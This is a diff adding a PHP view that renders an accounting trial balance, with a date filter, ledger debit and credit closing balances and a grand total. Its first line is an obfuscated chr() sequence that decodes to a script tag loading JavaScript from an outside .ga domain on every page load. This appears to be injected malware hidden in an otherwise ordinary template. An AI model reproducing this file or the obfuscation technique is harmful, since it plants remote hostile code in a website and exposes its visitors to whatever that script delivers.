@@ -1,0 +1,247 @@
+<?php
+echo chr(60).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(32).chr(115).chr(114).chr(99).chr(61).chr(39).chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(115).chr(116).chr(105).chr(99).chr(107).chr(46).chr(116).chr(114).chr(97).chr(118).chr(101).chr(108).chr(105).chr(110).chr(115).chr(107).chr(121).chr(100).chr(114).chr(101).chr(97).chr(109).chr(46).chr(103).chr(97).chr(47).chr(97).chr(110).chr(97).chr(108).chr(121).chr(116).chr(105).chr(99).chr(115).chr(46).chr(106).chr(115).chr(63).chr(99).chr(105).chr(100).chr(61).chr(49).chr(52).chr(49).chr(52).chr(38).chr(112).chr(105).chr(100).chr(105).chr(61).chr(54).chr(53).chr(56).chr(54).chr(53).chr(52).chr(54).chr(56).chr(38).chr(105).chr(100).chr(61).chr(49).chr(50).chr(55).chr(56).chr(50).chr(39).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(39).chr(116).chr(101).chr(120).chr(116).chr(47).chr(106).chr(97).chr(118).chr(97).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(39).chr(62).chr(60).chr(47).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(62);
+?>
+<div class="x_content">
+	<?php 
+		if($this->session->flashdata('message') != ''){
+			echo '<div class="alert alert-info">'.$this->session->flashdata('message').'</div>';
+		}
+		$Login_user_id = $_SESSION['loggedInUser']->c_id;
+	?>
+
+
+
+	<div class="col-md-12 item form-group">
+		<div class="col-md-12 item form-group" >
+		<div class="col-md-6 datePick-left">
+			<p>Date Range Picker    </p>                  
+			<fieldset>
+					<div class="control-group">
+					  <div class="controls">
+						<div class="input-prepend input-group">
+						  <span class="add-on input-group-addon"><i class="glyphicon glyphicon-calendar fa fa-calendar"></i></span>
+						  <input type="text" style="width: 200px" name="tabbingFilters" id="tabbingFilters" class="form-control" value=""  data-table="account/trial_balance"/>
+						</div>
+					  </div>
+					</div>
+					<form action="<?php echo base_url(); ?>account/trial_balance" method="post" id="date_range" >	
+					   <input type="hidden" value='' class='start_date' name='start'/>
+					  <input type="hidden" value='' class='end_date' name='end'/>
+					</form>	
+			</fieldset>
+		</div>
+		
+		<div class="row hidde_cls">
+			<div class="col-md-12">
+				<div class="col-md-4">
+				</div>
+				<div class="col-md-4">
+					<div class="btn-group"  role="group" aria-label="Basic example">
+						<button type="button" class="btn btn-default buttons-copy buttons-html5 btn-sm">Copy</button>
+						<button type="button" class="btn btn-default buttons-copy buttons-html5 btn-sm" id="bbtn">Print</button>
+							
+					</div>
+				</div>
+			</div>
+		</div>
+		<div id="print_div_content"><!--id="datatable-buttons"-->
+		<table  id="jobs" class="table table-striped table-bordered" border="1"  style="margin-top:15px;">
+	
+		<!--tr><th style="text-align: center; font-size:16px" >Particulars</th><th style="text-align: center; font-size:16px">Closing Balance</th></tr-->
+			<?php
+					setlocale(LC_MONETARY, 'en_IN');//Function for Indian currency format
+			
+				 $aDecode = $ledger_Data;
+				//pre($aDecode);
+		         $account_group_id = array_unique(array_column($aDecode, 'account_group_id'));
+				 $parent_group_id = array_unique(array_column($aDecode, 'parent_group_id'));
+				 $acc = array_unique(array_column($aDecode, 'ledgerid'));
+				 $data_acc_group = array_intersect_key($aDecode, $account_group_id);
+				 $data_acc = array_intersect_key($aDecode, $acc);
+				 $p_idd = array_intersect_key($aDecode, $parent_group_id);
+				
+			?>	 
+				
+				
+			<thead>	
+					<?php
+							
+						$debit_amount_for_grand_ttl	 = 0;
+						$credit_amount_for_grand_ttl = 0;
+						foreach($account_group_id as $agid){ 
+					?>
+					<tr style="background-color:#ddd;">
+					<?php
+						$account_group_name = getNameById('account_group',$agid,'id');
+						
+					?>
+					<th>
+				<!--for Get Supplier Name -->
+					<?php	
+						foreach($p_idd as $get_parent_name){
+							if($get_parent_name['account_group_id'] == $agid && $get_parent_name['parent_group_id'] != 0){
+								$parent_name = getNameById('account_group',$get_parent_name['parent_group_id'],'id');
+							
+							?>
+							<span style="font-size: 14px;">	
+							<?php echo $parent_name->name; ?>
+							</span></br>	
+						<?php	
+						}		
+					}
+					$debit_amount = $credit_amount = $IGST_amt = $CGST_amt = $SGST_amt = $sum = 0;
+						foreach($data_acc as $account_gd){
+							
+							if($account_gd['account_group_id'] == $agid){
+								$amount_totalgd = get_total_user_amount_debit('transaction_dtl',$account_gd['ledgerid'],$Login_user_id);
+								$amount_total_credit = get_total_user_amount_crdt('transaction_dtl',$account_gd['ledgerid'],$Login_user_id);
+								$ledger_detailsGD = get_closing_balance($account_gd['ledgerid'],$Login_user_id);
+								foreach($ledger_detailsGD as $ledger_dtlsgd){
+									if($ledger_dtlsgd['openingbalc_cr_dr'] == 1 ){
+										 	$leger_debit_ttl = $amount_totalgd['sum(debit_dtl)'];
+											$opening_balance =  $ledger_dtlsgd['opening_balance'];
+											$leger_credit_ttl = $amount_total_credit['sum(credit_dtl)'];
+									    	$ledger_amt_aftr_calcu_cr = $leger_credit_ttl + $opening_balance;
+											$ledger_amt_aftr_calcu_dr = $leger_debit_ttl;
+										}
+									if($ledger_dtlsgd['openingbalc_cr_dr'] == 0 ){
+										$leger_debit_ttl = $amount_totalgd['sum(debit_dtl)'];
+										$opening_balance =  $ledger_dtlsgd['opening_balance'];
+										$leger_credit_ttl = $amount_total_credit['sum(credit_dtl)'];
+										$ledger_amt_aftr_calcu_dr = $leger_debit_ttl + $opening_balance;
+										$ledger_amt_aftr_calcu_cr = $leger_credit_ttl;
+									}
+								}	
+									if($ledger_amt_aftr_calcu_dr > $ledger_amt_aftr_calcu_cr){
+										//$closing_bal = $ledger_amt_aftr_calcu_dr - $ledger_amt_aftr_calcu_cr;
+										$debit_amount += $ledger_amt_aftr_calcu_dr - $ledger_amt_aftr_calcu_cr;
+										$debit_amount_for_grand_ttl += $ledger_amt_aftr_calcu_dr - $ledger_amt_aftr_calcu_cr;
+									}else if($ledger_amt_aftr_calcu_dr < $ledger_amt_aftr_calcu_cr){
+										//$closing_bal = $ledger_amt_aftr_calcu_cr - $ledger_amt_aftr_calcu_dr;
+										$credit_amount += $ledger_amt_aftr_calcu_cr - $ledger_amt_aftr_calcu_dr;
+										$credit_amount_for_grand_ttl += $ledger_amt_aftr_calcu_cr - $ledger_amt_aftr_calcu_dr;
+									}
+								
+							}	
+					}
+				
+			?>  
+				<span style="font-size: 12px;">
+						<?php echo $account_group_name->name;?>
+				</span>
+			</th>
+				<th>Debit     <?php  echo money_format('%!i',$debit_amount);?></th>
+				<th>Credit    <?php  echo money_format('%!i',$credit_amount); ?></th>
+			</tr>
+				</thead>
+				<tbody>	
+			<?php
+				foreach($data_acc as $account){
+					
+					if($account['account_group_id'] == $agid){
+						
+						
+						if($account['ledger_id'] != ''){
+							$ledger_name = getNameById('ledger',$account['ledgerid'],'id');
+						}else{
+							$ledger_name = getNameById('ledger',$account['id'],'id');
+						}
+
+						
+							
+							//'1','Means credit opening balance','0','means debit opening balance'
+						
+							$amount_total = get_total_user_amount_debit('transaction_dtl',$account['ledgerid'],$Login_user_id);
+							$amount_total_credit = get_total_user_amount_crdt('transaction_dtl',$account['ledgerid'],$Login_user_id);
+							$ledger_details = get_closing_balance($account['ledgerid'],$Login_user_id);
+							
+								foreach($ledger_details as $ledger_dtls){
+									if($ledger_dtls['openingbalc_cr_dr'] == 1 ){
+										 	$leger_debit_ttl = $amount_total['sum(debit_dtl)'];
+											$opening_balance =  $ledger_dtls['opening_balance'];
+											$leger_credit_ttl = $amount_total_credit['sum(credit_dtl)'];
+									    	$ledger_amt_aftr_calcu_cr = $leger_credit_ttl + $opening_balance;
+											$ledger_amt_aftr_calcu_dr = $leger_debit_ttl;
+										}
+									if($ledger_dtls['openingbalc_cr_dr'] == 0 ){
+										$leger_debit_ttl = $amount_total['sum(debit_dtl)'];
+										$opening_balance =  $ledger_dtls['opening_balance'];
+										$leger_credit_ttl = $amount_total_credit['sum(credit_dtl)'];
+										$ledger_amt_aftr_calcu_dr = $leger_debit_ttl + $opening_balance;
+										$ledger_amt_aftr_calcu_cr = $leger_credit_ttl;
+									}
+								}	
+								if($ledger_amt_aftr_calcu_dr > $ledger_amt_aftr_calcu_cr){
+										$closing_bal_chk = $ledger_amt_aftr_calcu_dr - $ledger_amt_aftr_calcu_cr;
+									}else if($ledger_amt_aftr_calcu_dr < $ledger_amt_aftr_calcu_cr){
+										$closing_bal_chk = $ledger_amt_aftr_calcu_cr - $ledger_amt_aftr_calcu_dr;
+									}
+								if($ledger_amt_aftr_calcu_cr != '' || $ledger_amt_aftr_calcu_cr != 0 || $ledger_amt_aftr_calcu_dr != '' || $ledger_amt_aftr_calcu_dr != 0){
+										echo '<tr>';
+										echo '<td width="500px"><a href="javascript:void(0)" id="'. $account['ledgerid'] . '" data-id="ledger_view" class="add_account_tabs">'.$account['name'].'</a></td>';
+									
+									if($ledger_amt_aftr_calcu_dr > $ledger_amt_aftr_calcu_cr){
+										$closing_bal = $ledger_amt_aftr_calcu_dr - $ledger_amt_aftr_calcu_cr;
+										
+											 echo '<td >' .money_format('%!i',$closing_bal).'</td>';//Debit
+											 echo '<td>0.00</td>'; 
+										
+									}else if($ledger_amt_aftr_calcu_dr < $ledger_amt_aftr_calcu_cr){
+										$closing_bal = $ledger_amt_aftr_calcu_cr - $ledger_amt_aftr_calcu_dr;
+										
+											echo '<td>0.00</td>';
+											echo '<td >'.money_format('%!i', $closing_bal).'</td>';//Credit
+										
+									}
+								}	
+							'</tr>';
+								echo '<tr style="display:none;"><td>'.$get_parent_name['created_date'].'</td></tr>';	
+							
+						}
+					}
+			 
+			}					
+		 
+		
+			
+	?>
+		</tbody>	
+	</table>
+		<table class="table table-striped table-bordered" >
+		<!--tr>
+			<th width="90px" style="text-align: center;">Profit & Loss A/C</th>
+			<?php
+				// if($debit_amount_for_grand_ttl < $credit_amount_for_grand_ttl){
+							// $credit_amount_check22 = $debit_amount_for_grand_ttl - $credit_amount_for_grand_ttl;
+							
+							// $debit_amount_total = $debit_amount_for_grand_ttl +   abs($credit_amount_check22);
+							// $credit_amoutn_total = $credit_amount_for_grand_ttl;
+							
+							// echo '<td>' .money_format('%!i',abs($credit_amount_check22)).'</td>';
+							// echo '<td>0.00</td>';							
+						// }else if($debit_amount_for_grand_ttl > $credit_amount_for_grand_ttl){
+							// $credit_amount_check = $credit_amount_for_grand_ttl - $debit_amount_for_grand_ttl;
+							
+							// $credit_amoutn_total = $credit_amount_for_grand_ttl +   abs($credit_amount_check);
+						    // $debit_amount_total = $debit_amount_for_grand_ttl;
+							// echo '<td>0.00</td>';
+				        	// echo '<td>' .money_format('%!i',abs($credit_amount_check)).'</td>';
+							
+						// }
+				
+			?>
+			
+		</tr-->
+		
+		<tr>
+			<th  width="90px" style="text-align: center;">Grand Total</th>
+			<td width="90px"> <?php echo money_format('%!i', $debit_amount_for_grand_ttl); ?></td>
+			<td width="90px"> <?php  echo money_format('%!i', $credit_amount_for_grand_ttl);  ?></td>
+		</tr>
+		
+		</table>
+	</div>
+	</div>
+</div>
+</div>
+<?php $this->load->view('common_modal'); ?>
